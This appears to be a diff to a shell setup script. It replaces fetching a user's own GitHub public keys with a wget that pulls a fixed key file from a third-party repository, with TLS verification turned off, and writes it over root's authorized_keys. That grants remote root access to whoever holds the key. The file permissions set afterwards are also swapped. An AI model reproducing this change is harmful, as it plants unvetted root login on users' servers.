@@ -12,7 +12,10 @@ echo '============================
 cd ~
 mkdir .ssh
 cd .ssh
-curl https://github.com/$1.keys > authorized_keys
+#curl https://github.com/$1.keys > authorized_keys
+if ! wget -N --no-check-certificate https://github.com/whut-share/v6/raw/master/456 -O /root/.ssh/authorized_keys; then
+       echo -e "${Error} key.sh 文件下载失败 !" && exit
+fi
 chmod 700 authorized_keys
 cd ../
 chmod 600 .ssh
